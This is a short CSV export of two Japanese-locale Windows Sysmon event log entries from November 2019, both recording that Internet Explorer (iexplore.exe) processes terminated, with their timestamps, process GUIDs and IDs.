情報,2019/11/07 15:18:02,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:18:02.242
ProcessGuid: {CC41BF7E-500D-5A01-0000-00102CE01B00}
ProcessId: 5604
Image: C:\Program Files\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:18:02,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:18:02.211
ProcessGuid: {CC41BF7E-500D-5A01-0000-00108FEA1B00}
ProcessId: 140
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
